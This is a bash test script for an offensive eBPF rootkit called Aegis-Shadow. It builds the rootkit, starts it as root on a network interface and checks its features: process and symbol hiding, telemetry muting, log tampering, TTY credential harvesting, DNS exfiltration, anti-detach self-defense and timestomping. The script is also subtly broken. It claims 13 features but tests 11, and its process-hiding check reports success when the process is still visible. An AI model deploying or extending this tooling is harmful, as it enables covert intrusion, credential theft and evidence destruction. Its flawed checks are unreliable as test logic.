#!/bin/bash
# Aegis-Shadow Offense Testing Script
# Tests all 13 offensive rootkit features

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo "🔥 Aegis-Shadow Offense Test Suite"
echo "=================================="
echo ""

# Check if running as root
if [ "$EUID" -ne 0 ]; then 
    echo -e "${RED}Error: This script must be run as root${NC}"
    exit 1
fi

# Build the project
echo -e "${YELLOW}Building offense components...${NC}"
cargo xtask build-ebpf --release
cargo build --release --bin offense

# Test 1: Process Hiding
echo -e "\n${YELLOW}Test 1: Process Hiding${NC}"
echo "Starting offense loader in background..."
./target/release/offense --iface eth0 --hide-pid $$ &
OFFENSE_PID=$!
sleep 2

echo "Checking if current shell PID is hidden..."
if ps aux | grep -q "$$"; then
    echo -e "${GREEN}✓ Process hiding active${NC}"
else
    echo -e "${RED}✗ Process hiding failed${NC}"
fi

# Test 2: Network Stealth
echo -e "\n${YELLOW}Test 2: Network Stealth (XDP)${NC}"
echo "XDP program should be attached to eth0"
ip link show eth0 | grep -q "xdp" && echo -e "${GREEN}✓ XDP attached${NC}" || echo -e "${RED}✗ XDP not attached${NC}"

# Test 3: File Obfuscation
echo -e "\n${YELLOW}Test 3: File Obfuscation${NC}"
TEST_FILE="/tmp/aegis_test_file.txt"
echo "secret data" > $TEST_FILE
INODE=$(stat -c %i $TEST_FILE)
echo "Test file inode: $INODE"
echo "Obfuscation would be tested with --obfuscate-inode $INODE"

# Test 4: Telemetry Muting
echo -e "\n${YELLOW}Test 4: Telemetry Muting${NC}"
echo "Audit hooks should be active (check dmesg for events)"

# Test 5: Credential Harvesting
echo -e "\n${YELLOW}Test 5: Credential Harvesting${NC}"
echo "TTY monitoring would be tested with --monitor-tty option"

# Test 6: Log Tampering
echo -e "\n${YELLOW}Test 6: Log Tampering${NC}"
echo "Log tampering hooks active (check kernel logs)"

# Test 7: Process Ancestry Spoofing
echo -e "\n${YELLOW}Test 7: Process Ancestry Spoofing${NC}"
echo "PPID spoofing would be tested with --spoof-ppid option"

# Test 8: DNS Exfiltration
echo -e "\n${YELLOW}Test 8: DNS Exfiltration${NC}"
echo "TC egress program should be attached"
tc filter show dev eth0 egress | grep -q "bpf" && echo -e "${GREEN}✓ TC filter attached${NC}" || echo -e "${YELLOW}⚠ TC filter not found${NC}"

# Test 9: Kallsyms Hiding
echo -e "\n${YELLOW}Test 9: Kallsyms Hiding${NC}"
echo "Checking /proc/kallsyms for shadow_ symbols..."
if grep -q "shadow_" /proc/kallsyms; then
    echo -e "${YELLOW}⚠ shadow_ symbols visible (hiding not active)${NC}"
else
    echo -e "${GREEN}✓ shadow_ symbols hidden${NC}"
fi

# Test 10: Anti-Detach
echo -e "\n${YELLOW}Test 10: Anti-Detach Self-Defense${NC}"
echo "Anti-detach tracepoint should be active"

# Test 11: Timestomping
echo -e "\n${YELLOW}Test 11: Timestomping${NC}"
echo "Timestomping would be tested with --timestomp option"

# Cleanup
echo -e "\n${YELLOW}Cleaning up...${NC}"
kill $OFFENSE_PID 2>/dev/null || true
rm -f $TEST_FILE

echo -e "\n${GREEN}Test suite completed!${NC}"
echo "Note: Some tests require specific configurations or manual verification"

# Made with Bob
